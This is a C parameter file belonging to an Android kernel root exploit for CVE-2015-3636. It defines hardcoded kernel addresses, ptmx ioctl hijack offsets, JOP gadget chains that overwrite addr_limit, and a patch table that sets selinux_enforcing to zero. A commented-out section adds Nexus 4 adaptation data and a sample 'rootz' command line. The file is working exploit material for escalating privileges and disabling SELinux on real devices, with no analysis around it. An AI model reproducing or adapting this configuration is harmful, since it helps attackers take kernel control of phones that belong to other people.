/*
 * CVE-2015-3636 exploit adp args
 *
 * Copyright (C) 2018 by idhyt3r@gmail.com
 *
 */

#include "param.h"

/* 

  通用内核函数地址定义在 param.h 头文件中
  
  针对不同手机适配需要特殊定义的，在该头文件中定义

*/

// #define TEST_FOR_TEST

#ifdef TEST_FOR_TEST

unsigned long adp_ptmx_fops = 0xc1237658;

unsigned long adp_ptmx_fops_ioctl_offset = 0x20;

unsigned long adp_ptmx_fops_ioctl = adp_ptmx_fops + adp_ptmx_fops_ioctl_offset;

unsigned long adp_before_kernel_sock_ioctl = 0xc05cfc70;

unsigned long adp_kernel_sock_ioctl = 0xC085ED40;

unsigned long adp_ptmx_fops_ioctl_back_addr = 0xc027ac48;

unsigned long adp_task_security_offset = 0x58;

unsigned long adp_init_task = 0xc1042f38;

// set_fs to patch thread_info->addr_limit
struct jop_gadget j_jop1[0x10] = {
  {0xf8, 0xaaaaaaaa,},  // jop_buf
  {0xc, 0xC085ED40,},   // kernel_sock_ioctl
  {0x18, 0xaaaaaaaa,},  // jop_buf
  {0x24, 0xc027ac48,},  // ptmx_fops_ioctl_back_addr
  {0, 0,},
};

unsigned long adp_selinux_enforcing = 0xc122dae4;

unsigned long adp_tty_ioctl = 0xC047247C;

struct patch_gadget p_patch[0x10] = {
  {0xc122dae4, 0x00, sizeof(int)},  // selinux_enforcing
  {0xc1237658 + 0x20, 0xC047247C, sizeof(long)}, // restore ioctl
  {0, 0,},
};

#endif
#if 0

适配信息 

/* nexus 4 */
Linux version 3.4.0-perf-gf43c3d9 (android-build@vpbs1.mtv.corp.google.com) (gcc version 4.6.x-google 20120106 (prerelease) (GCC) ) #1 SMP PREEMPT Mon Jun 17 16:55:05 PDT 2013

/data/local/tmp/rootz "n=1041&k=[101=0xc0fffaa0;102=0x20;104=0xc0e3fb18;105=0x48;106=0xc03b42d4;109=0x4;&j=[0x0c1000f8=0x0c100000;0x0c10000c=0xc06958b0;0x0c100018=0x0c100000;0x0c100024=0xc06958dc;0x0=0x0;]&p=[0xc12c38e0=0x0=0x4;0xc1378330=0xc04338f0=0x4;]"

#endif